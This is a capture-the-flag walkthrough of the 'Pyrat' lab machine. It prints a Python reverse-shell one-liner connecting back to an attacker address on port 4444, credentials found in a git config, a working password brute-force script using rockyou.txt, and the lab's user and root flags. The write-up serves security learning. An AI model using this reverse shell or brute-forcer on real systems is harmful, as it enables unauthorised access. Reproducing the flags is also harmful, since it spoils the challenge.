
# Pyrat

Test your enumeration skills on this boot-to-root machine.

# Task 1 - Pyrat

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.


## Escaneo


## Puertos
### 8000

```
~ curl -v http://10.80.181.71:8000/
*   Trying 10.80.181.71:8000...
* Connected to 10.80.181.71 (10.80.181.71) port 8000 (#0)
> GET / HTTP/1.1
> Host: 10.80.181.71:8000
> User-Agent: curl/7.88.1
> Accept: */*
>
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/3.11.2
< Date: Mon Jan 19 02:09:34  2026
< Content-type: text/html; charset=utf-8
< Content-Length: 27
<
* Excess found in a read: excess = 3, size = 27, maxdownload = 27, bytecount = 0
* Closing connection 0
Try a more basic connection#
```


```
pyrat nc 10.81.172.200 8000
print('hola')
hola


import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.128.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

```

```
nc -lnvp 4444
pwd
/opt/dev/.git

cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
        
        
```

```
$ su su think
su think
Password: _TH1NKINGPirate$_

think@ip-10-81-172-200:/opt/dev/.git$

pwd
/home/think
think@ip-10-81-172-200:~$ cat user.txt              cat user.txt
cat user.txt
996bdb1f619a68361417cabca5454705
think@ip-10-81-172-200:~$


```


```
think@ip-10-81-172-200:/opt/dev/.git$ git log -p                            git log -p
git log -p
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
:
```

. buscamos user




- buscamos pass
```python
import socket
import sys

# Path to the rockyou.txt file (or any wordlist)
wordlist_path = "/usr/share/wordlists/rockyou.txt"

# Server connection details
host = "10.81.172.200"  # Replace with target IP or domain
port = 8000         # Replace with the port the server is running on

def connect_to_server(host, port):
    try:
        # Create a socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        return client_socket
    except Exception as e:
        print(f"Error connecting to server: {e}")
        sys.exit(1)

def brute_force_admin_password(wordlist_path):
    try:
        with open(wordlist_path, "r", encoding="latin-1") as wordlist:
            for password in wordlist:
                password = password.strip()

                client_socket = connect_to_server(host, port)
                
                # Send the 'admin' command to trigger the password prompt
                client_socket.sendall(b"admin\n")
                response = client_socket.recv(1024).decode("utf-8")
                
                if "Password:" in response:
                    # Send the current password attempt
                    client_socket.sendall((password + "\n").encode("utf-8"))

                    # Get server response
                    response = client_socket.recv(1024).decode("utf-8")
                    
                    if "Welcome Admin!!!" in response:
                        print(f"Success! Admin password is: {password}")
                        client_socket.close()
                        break
                    else:
                        print(f"Failed password attempt: {password}")
                    client_socket.close()
                else:
                    print("Unexpected response from server.")
                    break

    except FileNotFoundError:
        print(f"Wordlist file {wordlist_path} not found.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("Starting brute force attack on admin password...")
    brute_force_admin_password(wordlist_path)

```


```
➜  pyrat nc 10.81.172.200 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# cd /root
cd /root
# ls
ls
pyrat.py  root.txt  snap
# cat root.txt
cat root.txt
ba5ed03e9e74bb98054438480165e221
```